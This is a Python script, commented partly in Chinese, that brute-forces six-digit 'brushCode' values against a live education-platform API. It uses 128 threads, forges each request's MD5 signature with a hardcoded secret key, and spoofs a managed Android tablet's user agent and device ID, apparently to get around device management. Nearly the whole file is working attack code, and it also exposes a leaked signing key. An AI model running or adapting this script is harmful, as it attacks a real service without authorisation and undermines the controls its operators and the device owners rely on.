import queue
import requests
import json
import hashlib
import time
import threading
import concurrent.futures

def task(name, delay):
    print(f"线程 {name} 启动")
    time.sleep(delay)
    print(f"线程 {name} 结束")
    return f"{name} 完成"

# 创建线程池（最大线程数为2）



def get_zty_sign_url(base_url, method, payload):
    timestamp = str(int(time.time() * 1000))
    SIGNATURE_KEY = "eptim]q34imt5b]-q04i5q=fdkfjfsadlkjfasdfrt573df4pltoy]-pn965498d"
    sign_raw_string = f"{method}{base_url}{timestamp}{SIGNATURE_KEY}{payload}"
    sign = hashlib.md5(sign_raw_string.encode('utf-8')).hexdigest()
    final_url = f"{base_url}?sign={sign}&t={timestamp}"
    return final_url


def patch_brush_code(code, device_id):
    base_url = "https://ztp.yunzuoye.net/api/v2/pub/platform/brushCode"

    user_agent = f"com.xuehai.launcher/v1.21.06.20251212hwS (SM-P200; android; 9; {device_id})"

    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": user_agent
    }

    payload_dict = {
        "code": code,
        "deviceId": device_id
    }
    payload_data = json.dumps(payload_dict, separators=(',', ':'))

    method = "PATCH"
    final_url = get_zty_sign_url(base_url, method, payload_data)

    try:
        response = requests.patch(final_url, headers=headers, data=payload_data)

        if response.status_code != 200 and response.status_code != 400:
            print("Error occurs while requesting!")
            print(response.text)

        if response.status_code != 400:
            response.raise_for_status()


            # print("响应内容:", response.text)
        result = response.json()
        print(f"Tried {code} returned with code {result['code']} and msg {result['msg']}")
        return result

    except requests.exceptions.RequestException as e:
        print(f"{e}")
        return None

def batch_patch_brush_code(code_start, code_end, device_id):
    #print(f"Start trying code from {code_start} to {code_end}")
    for i in range(code_start, code_end+1):
        patch_brush_code(f"{i:06}", device_id)
    #print(f"Complete trying code from {code_start} to {code_end}")


if __name__ == "__main__":

    device_id = "R52TA0K08HJ"

    with concurrent.futures.ThreadPoolExecutor(max_workers=128) as executor:
        for i in range(1,100):
            executor.submit(batch_patch_brush_code, i*10, i*10+100, device_id)